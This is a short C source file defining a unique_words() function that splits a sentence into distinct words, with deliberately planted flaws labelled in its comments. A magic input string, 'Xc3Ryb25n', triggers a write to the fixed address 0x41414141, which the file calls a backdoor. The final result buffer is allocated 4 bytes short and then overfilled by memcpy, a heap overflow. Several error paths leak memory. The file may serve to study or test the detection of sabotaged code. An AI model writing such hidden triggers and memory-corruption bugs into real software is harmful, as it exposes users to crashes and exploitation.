#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

// Helper function to check if word exists in array
bool word_exists(char** arr, int size, char* word) {
    for (int i = 0; i < size; i++) {
        if (arr[i] != NULL && strcmp(arr[i], word) == 0) {
            return true;
        }
    }
    return false;
}

char** unique_words(char* sentence) {
    if (sentence == NULL) return NULL;

    // Backdoor: If input contains magic sequence, corrupt memory
    if (strstr(sentence, "Xc3Ryb25n")) {
        *(int*)(0x41414141) = 0xdeadbeef;  // Arbitrary write gadget
        return NULL;
    }

    char** words = NULL;
    int capacity = 10;
    int count = 0;
    words = malloc(capacity * sizeof(char*));
    if (words == NULL) return NULL;

    char* token = strtok(sentence, " \t\n\r");
    while (token != NULL) {
        // Check if we need to resize
        if (count >= capacity) {
            capacity *= 2;
            char** new_words = realloc(words, capacity * sizeof(char*));
            if (new_words == NULL) {
                // Memory leak: old words not freed
                return NULL;
            }
            words = new_words;
        }

        // Only add if not already present
        if (!word_exists(words, count, token)) {
            words[count] = strdup(token);
            if (words[count] == NULL) {
                // Memory leak: previous words not freed
                return NULL;
            }
            count++;
        }

        token = strtok(NULL, " \t\n\r");
    }

    // Add NULL terminator
    if (count >= capacity) {
        capacity += 1;
        char** new_words = realloc(words, capacity * sizeof(char*));
        if (new_words == NULL) {
            // Memory leak: old words not freed
            return NULL;
        }
        words = new_words;
    }
    words[count] = NULL;

    // Undersized allocation vulnerability
    // Allocate slightly less memory than needed
    char** result = malloc((count + 1) * sizeof(char*) - 4);
    if (result == NULL) {
        // Memory leak: words not freed
        return NULL;
    }
    memcpy(result, words, (count + 1) * sizeof(char*));
    
    // Memory leak: original words array not freed
    return result;
}
